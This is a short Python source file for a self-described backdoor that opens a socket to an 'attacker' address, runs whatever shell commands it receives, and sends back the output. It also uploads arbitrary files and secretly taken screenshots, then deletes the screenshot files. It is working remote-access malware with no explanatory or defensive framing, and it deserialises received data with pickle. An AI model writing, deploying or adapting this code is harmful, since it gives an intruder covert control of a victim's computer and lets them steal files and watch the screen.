import socket
import os,json
import subprocess,pickle
from datetime import datetime
from PIL import ImageGrab
from datetime import datetime


class Backdoor:

    def __init__(self,ip,port):

        # connecting to the attacker
        self.c = socket.socket()
        self.c.connect((ip,port))
        print(self.c.recv(1024).decode('utf-8'))

    def reliable_send(self,command):
        self.c.sendall(pickle.dumps(command))
        
    def reliable_recv(self):

        recv_data = b''
        while True:
            try:
                recv_data += self.c.recv(1024)
                return pickle.loads(recv_data)
            except pickle.UnpicklingError:
                continue

    def execute_command(self,command):
        
        print("Executing -> %s" % command)
        
        command_list = command.split()

        if command_list[0] == 'cd':
            os.chdir(command_list[1])
            return os.getcwd().encode('utf-8')

        elif command_list[0] == 'c_download':
            path = command_list[1]

            file_to_send = open(path,'rb')
            file_content = file_to_send.read()
            file_to_send.close()

            # returning the bytes from the fle            
            return file_content
        elif command_list[0] == 'c_screenshot':
            
            ss = ImageGrab.grab()

            # saving the photo temporarily
            name = datetime.now().strftime("%d_%m_%y_%H_%M_%S") + ".png"
            ss.save(name)

            # sending the file back to the attacker
            file_to_send = open(name,'rb')
            file_content = file_to_send.read()
            file_to_send.close()

            # after sending deleting the file
            os.remove(name)

            return file_content

        else:
            output = subprocess.run(command_list,stdout=subprocess.PIPE)
            return output.stdout

    def run(self):
        while True:
            command = self.reliable_recv()

            if command.lower() == 'exit':
                break

            output = self.execute_command(command)
            self.reliable_send(output)


backdoor = Backdoor(ip='localhost',port=8001)
backdoor.run()

